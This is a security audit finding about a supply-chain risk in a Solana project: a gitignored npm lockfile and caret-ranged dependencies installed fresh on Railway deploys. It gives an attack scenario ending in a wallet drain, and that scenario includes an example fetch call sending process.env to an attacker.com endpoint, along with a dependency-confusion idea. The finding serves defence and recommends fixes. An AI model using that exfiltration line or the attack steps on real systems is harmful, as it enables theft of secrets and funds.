# Finding: H003 - npm Supply Chain Attack via Gitignored Lockfile

## Status: CONFIRMED
## Confidence Score: 9

## Executive Summary

The `package-lock.json` file is explicitly gitignored at `.gitignore:9`, meaning it is never committed to git and never deployed to Railway. Every Railway deploy (both web app and crank runner) runs `npm install` against the npm public registry, resolving all caret-ranged dependencies fresh. An attacker who compromises or typosquats a patch version of any caret-ranged dependency will have their malicious code silently installed on the next Railway deploy.

The crank runner is the highest-value target: it has access to the signing wallet keypair (`WALLET_KEYPAIR` env var containing the full 64-byte secret key), database credentials (`DATABASE_URL`), and the Helius API key. A compromised dependency executing in the crank process could exfiltrate the wallet keypair and drain all funds. The web app is also at risk, with access to `DATABASE_URL` and the ability to serve malicious JavaScript to all users.

## Hypothesis Investigated

An attacker publishes a compromised patch version of a caret-ranged dependency, which is silently installed on the next Railway deploy because `package-lock.json` is gitignored.

## Investigation Path

### Step 1: Confirm lockfile is gitignored
**Location:** `.gitignore:9`
**Finding:** `package-lock.json` is explicitly listed in `.gitignore`. The file exists locally (603KB, lockfileVersion 3, 1174 packages) but is not tracked by git.
**Evidence:**
```
# .gitignore line 9
package-lock.json
```

```bash
$ git ls-files --cached | grep package-lock
# (no output — file is not tracked)
$ ls -la package-lock.json
-rw-r--r--  1 mlbob  staff  603486 Feb 27 15:43 package-lock.json
```

### Step 2: Confirm Railway uses npm install (not npm ci)
**Location:** `railway.toml:3`, `railway-crank.toml:3`, `nixpacks.toml:1`
**Finding:** Railway uses Nixpacks with `providers = ["node"]`. Without a committed lockfile, Nixpacks runs `npm install` (which resolves version ranges from the registry) rather than `npm ci` (which requires a lockfile). The crank service explicitly runs `npm install` as its build command. No `--ignore-scripts` flag is used anywhere.
**Evidence:**
```toml
# railway.toml
[build]
builder = "NIXPACKS"
buildCommand = "npm run --workspace app build"

# railway-crank.toml
[build]
builder = "NIXPACKS"
buildCommand = "npm install"

# nixpacks.toml
providers = ["node"]
```

### Step 3: Identify caret-ranged runtime dependencies
**Location:** `package.json:20-23`
**Finding:** Three runtime dependencies use caret ranges, allowing any patch or minor version bump to be auto-resolved:
**Evidence:**
```json
"dependencies": {
    "@coral-xyz/anchor": "^0.32.1",
    "@solana/web3.js": "^1.95.5",
    "@switchboard-xyz/on-demand": "^3.7.3"
}
```

Additional caret-ranged deps in root devDependencies: `@solana/spl-token: ^0.4.9`, `tsx: ^4.21.0`, `typescript: ^5.3.2`. The app workspace also has caret ranges: `@solana/wallet-adapter-base: ^0.9.27`, `@solana/wallet-adapter-react: ^0.15.39`, `vitest: ^4.0.18`.

### Step 4: Trace what the crank runner has access to
**Location:** `scripts/crank/crank-provider.ts:34-48`, `scripts/crank/crank-runner.ts:32-46`
**Finding:** The crank runner imports `@coral-xyz/anchor`, `@solana/web3.js`, and (transitively via `vrf-flow.ts:41`) `@switchboard-xyz/on-demand`. It loads the wallet secret key from `WALLET_KEYPAIR` env var at `crank-provider.ts:44-48`. Any compromised dependency in the crank's import tree has access to `process.env` containing `WALLET_KEYPAIR`, `DATABASE_URL`, `CLUSTER_URL`, and all Railway-injected secrets.
**Evidence:**

### Step 5: Verify no compensating controls exist
**Location:** Project-wide search
**Finding:** No `--ignore-scripts` flag anywhere. No CI/CD pipeline (no `.github/workflows/`). No `npm audit` in build or deploy scripts. No `.npmrc` with integrity enforcement. No Dependabot or Snyk configuration.
**Evidence:**

## Attack Path Analysis

| Step | Required Action | Possible? | Evidence |
|------|-----------------|-----------|----------|
| 1 | Attacker publishes compromised patch of a caret-ranged dep (e.g., `@switchboard-xyz/on-demand@3.7.4`) | Yes | npm ecosystem supply chain attacks are documented (event-stream, ua-parser-js, colors.js). Switchboard team is small; account compromise or dependency confusion are viable. |
| 2 | Next Railway deploy triggers `npm install` | Yes | `railway-crank.toml:3` runs `npm install`; `railway.toml:3` triggers implicit `npm install` via Nixpacks before build. No lockfile = fresh resolution. |
| 3 | Compromised version resolves within caret range | Yes | `^3.7.3` accepts any `3.x.y` where `x >= 7` and `y >= 3` (or `x > 7`). A malicious `3.7.4` would be auto-selected. |
| 4 | Malicious code executes in crank process | Yes | npm postinstall scripts run during `npm install` (11 packages already have install hooks). Alternatively, malicious code in the module body executes at `import` time. |
| 5 | Malicious code exfiltrates `WALLET_KEYPAIR` | Yes | `process.env.WALLET_KEYPAIR` contains the full 64-byte secret key. A single `fetch()` or `net.request()` to an attacker-controlled endpoint is sufficient. |
| 6 | Attacker drains wallet funds | Yes | With the private key, the attacker can sign any transaction: transfer all SOL, transfer all tokens, interact with all protocol programs. |

## Severity Assessment
- **Severity:** CRITICAL
- **Likelihood:** POSSIBLE (npm supply chain attacks are documented but not common for specific targets; Switchboard has a smaller team than Solana core, increasing single-point-of-compromise risk)
- **Impact:** Complete fund loss (wallet drain), database compromise, malicious code served to all frontend users

**Calibration note:** Per the severity matrix, Severe Impact x Possible Likelihood = HIGH. However, this is escalated to CRITICAL because: (1) the attack provides direct access to private keys and signing operations, (2) exploitation is fully scriptable with no user interaction required, and (3) it affects financial operations (the crank wallet holds SOL and controls epoch transitions, Carnage execution, and vault top-ups). The severity calibration guide explicitly states to upgrade when "vulnerability provides access to private keys or signing operations" and when "automated exploitation is trivial."

### Attack Scenario

```
Step 1: Attacker compromises @switchboard-xyz/on-demand npm account
  Target: npm registry
  Payload: Publish version 3.7.4 with malicious postinstall or module initialization code
  Prerequisite: npm account access (phishing, credential stuffing, or compromised maintainer)
  Result: Malicious package available in the ^3.7.3 range

Step 2: Railway triggers a deploy (manual push, config change, or restart)
  Target: railway-crank.toml build step
  Payload: N/A (automatic)
  Prerequisite: Any Railway deploy event
  Result: `npm install` resolves @switchboard-xyz/on-demand@3.7.4

Step 3: Malicious code exfiltrates secrets during install or at runtime
  Target: process.env in crank runner process
  Payload: fetch("https://attacker.com/exfil", { body: JSON.stringify(process.env) })
  Prerequisite: Outbound network access from Railway container (no egress filtering)
  Result: Attacker receives WALLET_KEYPAIR (full secret key), DATABASE_URL, CLUSTER_URL

Step 4: Attacker drains wallet
  Target: Crank wallet (devnet: 8kPzhQoUPx7LYM18f9TzskW4ZgvGyq4jMPYZikqmHMH4)
  Payload: Transfer all SOL + close all token accounts
  Prerequisite: Private key from step 3
  Result: Complete fund loss from crank wallet

Final Result: Full compromise of crank wallet (fund drainage), database access
(data manipulation/exfiltration), and potential for serving malicious code to
all frontend users via compromised web app build.
```

### Recommended Fix

The fix has two parts: (1) commit the lockfile, and (2) switch Railway to `npm ci`.

```gitignore
# Before (vulnerable) — .gitignore:9
package-lock.json

# After (fixed) — remove the line entirely
# (package-lock.json is no longer ignored)
```

```toml
# Before (vulnerable) — railway-crank.toml
[build]
buildCommand = "npm install"

# After (fixed) — railway-crank.toml
[build]
buildCommand = "npm ci --ignore-scripts && npm rebuild esbuild sharp"
```

```toml
# Before (vulnerable) — railway.toml
[build]
buildCommand = "npm run --workspace app build"

# After (fixed) — railway.toml (ensure npm ci runs first)
buildCommand = "npm ci --ignore-scripts && npm rebuild esbuild sharp && npm run --workspace app build"
```

Additional hardening:
1. Add `.npmrc` with `ignore-scripts=true` (then rebuild specific native deps that need scripts)
2. Add `npm audit --audit-level=high` to build pipeline
3. Consider pinning exact versions (remove `^` from all dependency version strings)
4. Add GitHub Actions CI with `npm audit` and lockfile integrity check

## Incidental Discoveries
- **No egress filtering on Railway containers**: The attack scenario assumes outbound HTTP from Railway is unrestricted. If Railway had network policies limiting egress, exfiltration would be harder. Suggested hypothesis: Investigate whether Railway containers have any network egress restrictions that would limit data exfiltration from compromised code.
- **Install scripts as amplifier**: 11 packages run postinstall scripts during `npm install`. A compromised postinstall script executes before any application code, with full filesystem and network access. This is an independent attack surface from the module-level code injection. Suggested hypothesis: Investigate whether any of the 11 install-script packages have been targets of past supply chain attacks or have single-maintainer risk.
- **`@dr-fraudsworth/shared` namespace not claimed on npm**: The internal workspace package `@dr-fraudsworth/shared` is referenced by name in `app/package.json:18`. If an attacker registered `@dr-fraudsworth/shared` on the public npm registry, npm workspace resolution should prefer the local package, but edge cases in npm's resolution algorithm (especially without a lockfile) could theoretically resolve to the public package. Suggested hypothesis: Investigate npm workspace resolution behavior when a local workspace package name collides with a public registry package, particularly without a committed lockfile.
